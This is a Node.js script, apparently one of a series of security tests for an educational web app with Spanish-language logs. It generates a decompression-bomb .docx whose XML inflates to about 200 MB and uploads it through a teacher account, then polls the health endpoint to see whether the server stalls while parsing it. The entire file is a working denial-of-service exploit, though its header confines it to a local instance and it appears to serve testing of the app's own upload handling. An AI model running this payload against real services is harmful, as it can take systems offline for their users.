// Decompression bomb in a .docx: a small file whose word/document.xml inflates to hundreds
// of MB. mammoth (JSZip + xmldom) inflates and parses it in the API process.
// Usage: node 08-docx-bomb.mjs [MB]   (default 200). Run ONLY against a local instance.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createRequire } from "node:module";
import { setupTeacher, upload, BASE, sleep } from "./lib.mjs";

const require = createRequire(import.meta.url);
const JSZip = require("../../../../node_modules/jszip");
const MB = Number(process.argv[2] ?? 200);

const para = "<w:p><w:r><w:t>a</w:t></w:r></w:p>";
const body = para.repeat(Math.ceil((MB * 1024 * 1024) / para.length));
const zip = new JSZip();
zip.file("[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`);
zip.file("_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`);
zip.file("word/document.xml", `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${body}</w:body></w:document>`);
const buf = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE", compressionOptions: { level: 9 } });
const out = path.join(os.tmpdir(), `bomba-${MB}mb.docx`);
fs.writeFileSync(out, buf);
console.log(`docx generado: ${(buf.length / 1024).toFixed(0)} KB comprimido → ${MB} MB de XML (${out})`);

const A = await setupTeacher("Docente Bomba");
const t0 = Date.now();
const r = await upload(A.t, `/api/activities/${A.activityId}/files`, [{ name: "tarea.docx", data: buf, type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document" }]);
console.log("subida:", r.status, r.data.files?.[0]?.processingStatus);
// Watch the server while it processes the file in the background.
for (let i = 0; i < 90; i++) {
  await sleep(2000);
  const h0 = Date.now();
  let status;
  try {
    const res = await fetch(BASE + "/api/health", { signal: AbortSignal.timeout(5000) });
    status = res.status;
  } catch (e) {
    status = `sin respuesta (${e.name})`;
  }
  const lat = Date.now() - h0;
  let file = null;
  try {
    const f = await A.t.get(`/api/activities/${A.activityId}/files`);
    file = f.data.files?.[0]?.processingStatus;
  } catch {
    file = "?";
  }
  console.log(`t+${Math.round((Date.now() - t0) / 1000)}s health=${status} (${lat} ms) archivo=${file}`);
  if (typeof status !== "number" || file === "ready" || file === "failed") break;
}
